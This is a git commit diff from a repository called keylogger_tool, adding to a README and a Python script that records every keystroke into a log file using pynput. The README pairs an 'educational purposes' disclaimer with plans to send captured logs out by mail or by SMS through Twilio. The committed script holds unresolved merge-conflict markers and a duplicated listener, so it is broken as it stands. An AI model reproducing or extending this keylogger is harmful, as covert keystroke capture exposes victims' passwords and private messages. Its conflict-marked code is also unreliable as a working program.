ccfa7533a754dfdddcd512300d68b82fc8d98b80
okonofuabenjamin <98276921+okonofuabenjamin@users.noreply.github.com>
2023-03-14 20:09:42 +0100

    update to main, working on more updates

--- README.md
+++ README.md
@@ -1,2 +1,3 @@
 # keylogger_tool
-this tool is for educational purposes only and should be used for fun, not for malicious or unethical purposes...stay ethical
+this tool is for educational purposes only and should be used for fun, not for malicious or unethical purposes...stay ethical made by benji tech, will update it soon with features to send it directly with mail, you can tweak it with twilio to link it directly to sms
+
--- main.py
+++ main.py
@@ -2,6 +2,7 @@
 import pyautogui
 from pynput import keyboard
 
+<<<<<<< HEAD
 # Define a function to write the pressed key to a file
 def on_press(key):
     try:
@@ -19,3 +20,26 @@ def on_press(key):
 # Start the listener
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
+print("press enter to quit...")
+
+=======
+# Define a function to write the pressed key to a file
+def on_press(key):
+    try:
+        # If the key is a normal character, write it to the file
+        current_key = str(key.char)
+    except AttributeError:
+        # If the key is a special key, write it to the file with spaces around it
+        if key == keyboard.Key.space:
+            current_key = " "
+        else:
+            current_key = " " + str(key) + " "
+    with open('log.txt', 'a') as f:
+        f.write(current_key)
+
+# Start the listener
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+
+>>>>>>> 781fe6989a5410d0fa5f94b2328a15e005efd620
